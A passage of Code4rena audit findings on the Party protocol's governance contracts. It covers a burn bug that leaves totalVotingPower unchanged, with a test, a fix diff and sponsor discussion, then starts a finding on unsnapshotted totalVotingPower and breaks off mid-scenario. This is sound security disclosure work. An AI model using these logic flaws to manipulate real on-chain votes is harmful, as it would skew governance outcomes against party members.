<code>PartyGovernanceNFTUnit.sol</code> test file and add this import: <code>import \"../../contracts/party/PartyGovernance.sol\";</code> to access the <code>GovernanceValues</code> struct ).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_canntReachUnanimousVoteAfterBurning</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_initGovernance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter2</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voter3</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vp</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">defaultGovernanceOpts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token3</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mintedVotingPower</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">vp</span><span class=\"mtk1\">*</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCurrentVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">), </span><span class=\"mtk12\">vp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">PartyGovernance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">GovernanceValues</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gv</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGovernanceValues</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gv</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">gv</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGovernanceValues</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// totalVotingPower stays the same</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gv</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The remaining two voters will not be able to reach unanimous vote since the <code>_isUnanimousVotes</code> function is called with <code>totalVotingPower</code> as the total votes with which to calculate the percentage.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L988\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isUnanimousVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pv</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_governanceValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">)) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L1024\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isUnanimousVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pv</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gv</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">)) {</span></span></span></code></pre>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>It is important to understand that when <code>InitialETHCrowdfund</code> calls the <code>burn</code> function it is intended that <code>totalVotingPower</code> is not reduced.</p>\n<p>So we need to differentiate these two cases.</p>\n<p>Fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/party/PartyGovernanceNFT.sol b/contracts/party/PartyGovernanceNFT.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 9ccfa1f..d382d0e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/party/PartyGovernanceNFT.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/party/PartyGovernanceNFT.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -200,6 +200,7 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param tokenId The ID of the NFT to burn.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function burn(uint256 tokenId) external onlyDelegateCall {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address owner = ownerOf(tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint96 totalVotingPower = _governanceValues.totalVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             msg.sender != owner &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             getApproved[tokenId] != msg.sender &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -208,7 +209,6 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Allow minter to burn cards if the total voting power has not yet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // been set (e.g. for initial crowdfunds) meaning the party has not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // yet started.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint96 totalVotingPower = _governanceValues.totalVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (totalVotingPower != 0 || !isAuthority[msg.sender]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 revert UnauthorizedToBurnError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -218,6 +218,10 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         mintedVotingPower -= votingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         delete votingPowerByTokenId[tokenId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (totalVotingPower != 0 || !isAuthority[msg.sender]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            _governanceValues.totalVotingPower = totalVotingPower - votingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _adjustVotingPower(owner, -votingPower.safeCastUint96ToInt192(), address(0));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _burn(tokenId);</span></span></span></code></pre>\n<p>Also note that the <code>|| !isAuthority[msg.sender]</code> part of the condition is important.</p>\n<p>It ensures that if we are not yet in the governance phase, i.e. <code>totalVotingPower == 0</code> and a user calls the <code>burn</code> function he cannot burn his party card. This is because the <code>totalVotingPower - votingPower</code> subtraction results in an underflow.</p>\n<p>This ensures that in the pre-governance phase a user cannot accidentally burn his party card. He can only burn it via the <code>InitialETHCrowdfund</code> contract which ensures the user gets his ETH refund.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/10#issuecomment-1512060843\">0xble (Party) commented</a>:</strong></p>\n<blockquote>\n<p>@HollaDieWaldfee - I like the recommended mitigation. Had a question, if there were snapshots of <code>totalVotingPower</code> for each proposal is it fine that those are not updated? It is the same as if that an inactive user did not vote on a proposal, which can happen already. My concerns with updating it is that it seems like a riskier mitigation to implement that may cause unintended side-effects (if not now, later down the line). I also don’t want to add more storage to the contract to fix this (it is already at with the contract size limit with <code>--via-ir</code> enabled).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/10#issuecomment-1512065324\">HollaDieWaldfee (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@0xble - Yes I think it is ok to not update the snapshots. I have the same reasoning as you that it’s basically just an inactive user.</p>\n<p>And I agree that updating instead is wrong because it gives remaining users higher voting power.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/10#issuecomment-1512082911\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-07-totalvotingpower-needs-to-be-snapshotted-for-each-proposal-because-it-can-change-and-thereby-affect-consensus-when-accepting--vetoing-proposals\" style=\"position:relative;\"><a href=\"#m-07-totalvotingpower-needs-to-be-snapshotted-for-each-proposal-because-it-can-change-and-thereby-affect-consensus-when-accepting--vetoing-proposals\" aria-label=\"m 07 totalvotingpower needs to be snapshotted for each proposal because it can change and thereby affect consensus when accepting  vetoing proposals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/9\">[M-07] <code>totalVotingPower</code> needs to be snapshotted for each proposal because it can change and thereby affect consensus when accepting / vetoing proposals</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/9\">HollaDieWaldfee</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L598-L605\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L598-L605</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L46-L51\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L46-L51</a></p>\n<p>This issue does not manifest itself in a limited segment of the code.</p>\n<p>Instead it spans multiple contracts and derives its impact from the interaction of these contracts.</p>\n<p>In the PoC section I will do my best in explaining how this results in an issue.</p>\n<p>I discussed this with the sponsor and they explained to me that this issue is due to a PR that has unintentionally not been merged.</p>\n<p><img src=\"https://user-images.githubusercontent.com/118979828/231990051-b9f731f1-1678-43e3-81e4-7ec0164bdc10.png\" alt=\"Discord message\"></p>\n<p>So they have already written the code that is necessary to fix this issue. It’s just not been merged with this branch. So since the sponsor knows about this already and it’s just the PR that has gone missing it’s not necessary for me to provide the full Solidity code to fix this issue.</p>\n<p>In short, this issue is due to the fact that the <code>totalVotingPower</code> is not snapshotted when a proposal is created.</p>\n<p>The votes that are used to vote for a proposal (or veto it) are based on a specific snapshot (1 block prior to the proposal being created).</p>\n<p>When the <code>totalVotingPower</code> changes this leads to unintended consequences.</p>\n<p>When <code>totalVotingPower</code> decreases, votes become more valuable than they should be.</p>\n<p>And when <code>totalVotingPower</code> increases, votes become less valuable than they should be.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When a proposal is created via the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L527-L548\"><code>PartyGovernance.propose</code></a> function, the proposal’s <code>proposedTime</code> is set:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L537-L543\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ProposalStateValues</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proposedTime:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint40</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">passedTime:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">executedTime:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">completedTime:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">votes:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}),</span></span></span></code></pre>\n<p>When users then vote in order to accept the proposal or veto the proposal, their votes are based on the snapshot at the <code>proposedTime - 1</code> timestamp.</p>\n<p>We can see this in the <code>PartyGovernance.accept</code> function:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L592\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getVotingPowerAt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposedTime</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">snapIndex</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>And we can see it in the <code>VetoProposal.voteToVeto</code> function:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L37-L41\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">party</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotingPowerAt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proposalValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposedTime</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">snapIndex</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However the <code>totalVotingPower</code> to determine whether enough votes have been collected is the current <code>totalVotingPower</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L598-L605\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">values</span><span class=\"mtk1\">.</span><span class=\"mtk12\">passedTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_areVotesPassing</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">.</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_governanceValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_governanceValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">passThresholdBps</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L46-L51\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_areVotesPassing</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newVotes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governanceValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governanceValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">passThresholdBps</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span></code></pre>\n<p>The <code>totalVotingPower</code> is not constant. It can increase and decrease.</p>\n<p>Now we can understand the issue. The <code>totalVotingPower</code> must be based on the same time as the votes (i.e. <code>proposedTime - 1</code>).</p>\n<p>Let’s look at a scenario:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">At the time of proposal creation (proposedTime - 1):</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Alice: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Bob: 50 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Chris: 50 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 